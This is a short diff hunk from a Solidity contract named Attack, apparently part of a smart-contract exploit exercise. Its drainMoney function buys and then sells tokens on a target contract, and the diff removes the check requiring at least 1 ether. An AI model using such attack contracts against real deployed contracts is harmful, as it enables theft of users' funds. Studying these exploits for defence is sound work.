@@ -17,7 +17,6 @@ contract Attack {
     }
 
     function drainMoney() external payable {
-        require(msg.value >= 1 ether, "Not enough ether");
         erc20.buy{value: msg.value}();
         erc20.sell();
     }
